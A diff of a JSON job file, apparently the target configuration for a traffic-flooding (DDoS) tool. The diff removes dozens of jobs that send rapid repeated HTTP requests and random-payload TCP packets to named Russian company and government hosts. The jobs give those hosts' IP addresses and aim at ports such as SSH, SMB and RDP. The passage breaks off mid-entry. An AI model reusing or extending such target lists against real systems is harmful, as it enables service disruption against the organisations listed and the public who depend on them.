@@ -1,3327 +1,815 @@
 {
-    "jobs":
-    [
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.102:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.102:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://releases.1c.ru/total"
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://auth.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.206.15:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://auth.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.206.15:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://ofd.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.250:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://ofd.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.250:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://ofd.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.250:8081",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.154:22",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://www.kontur-extern.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.154:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://e-kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.154:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://www.b-kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.154:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://elba.kontur.ru/AccessControl/Login"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.41:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://elba.kontur.ru/AccessControl/Login"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.41:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://pf.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.249:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://pf.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.249:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://ca.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.131:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://ca.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.131:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://normativ.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.33:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://normativ.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.33:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://install.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.51:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://install.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.51:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://help.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.51:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://help.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.51:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://focus.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.206.17:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://kontur.documentoved.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.173.221.106:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://kontur.documentoved.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.173.221.106:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://www.documentoved.ru/"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.229.220.112:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.229.220.112:139",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://www.documentoved.ru/"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.229.220.112:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.229.220.112:445",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.229.220.112:3389",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.229.220.112:5986",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://school.kontur.ru/main"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.72:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://x5.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.207.135:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://x5.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.207.135:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://postavki.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.11:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://postavki.kontur.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.11:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://46.17.203.250"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.250:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://46.17.203.250"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.250:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://46.17.204.245"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.245:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://46.17.204.245"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.204.245:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://46.17.200.242"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.200.242:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://46.17.200.242"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.200.242:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:22",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://46.17.203.229"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.229:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:449",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:453",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:2222",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:3128",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:3129",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:5938",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://46.17.203.229"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "46.17.203.229:8443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "46.17.203.229:8444",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://regservice.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://regservice.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://regservice.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://callback.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://callback.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://callback.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.113:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "31.13.60.76:25",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://report.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "31.13.60.76:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "31.13.60.76:110",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "31.13.60.76:465",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://nsqadmin.1c-edo.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.38:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://nsqadmin.1c-edo.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.38:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://invitations.1c-edo.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.38:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://invitations.1c-edo.keydisk.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "91.239.5.38:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://service.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "146.120.90.20:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://service.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "146.120.90.20:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "146.120.90.20:513",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://gibdd.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "146.120.90.21:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://frap.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://frap.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "212.164.137.246:513",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://forum.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "146.120.90.25:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://forum.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "146.120.90.25:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://ca.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://ca.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "212.164.137.246:513",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://public.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://public.fsrar.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "212.164.137.246:513",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://ufo.fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://ufo.fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://dfo.fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://dfo.fsrar.gov.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://service.alcolicenziat.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://service.alcolicenziat.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "212.164.137.246:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://f4.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.187:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://f4.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.187:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.187:513",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://docs.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.187:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://docs.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.187:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.25:22",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://eln.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.25:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://eln.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.25:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://sedo.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.114:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.114:139",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.114:143",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://sedo.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.114:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.114:993",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.188:21",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://lk.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.188:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.188:139",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://lk.fss.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "193.148.44.188:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "193.148.44.188:445",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://websbor.gks.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://websbor.gks.ru"
-                },
-                "client":
-                {
